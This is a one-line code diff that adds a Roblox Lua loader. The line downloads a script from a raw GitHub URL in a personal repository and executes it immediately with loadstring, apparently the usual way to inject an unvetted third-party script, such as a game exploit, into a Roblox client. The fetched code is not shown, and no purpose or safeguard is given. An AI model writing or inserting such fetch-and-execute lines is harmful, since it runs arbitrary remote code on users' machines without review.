@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Wawacatking/script-/refs/heads/main/main"))()
